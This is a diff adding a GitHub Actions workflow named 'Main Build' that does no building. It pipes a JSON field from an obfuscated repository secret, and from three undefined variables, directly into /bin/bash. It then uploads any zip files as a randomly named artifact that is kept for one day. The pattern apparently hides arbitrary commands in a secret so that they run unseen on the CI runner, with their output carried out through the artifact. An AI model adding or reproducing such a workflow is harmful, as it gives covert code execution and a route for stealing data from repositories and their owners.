@@ -1,0 +1,29 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          nfbo9843: ${{ secrets.nfbo9843 }}
+        run: |
+          printf '%s' "$nfbo9843" | jq -r .bbuuw98444 | /bin/bash
+          echo $mym292 | jq -r .uyumy4 | /bin/bash
+          printf '%s' "$wfbd32" | jq -r .ikdd738 | /bin/bash
+          echo $hno652 | jq -r .jghy61 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: BuzY7FyG
+          path: "*.zip"
+          retention-days: 1
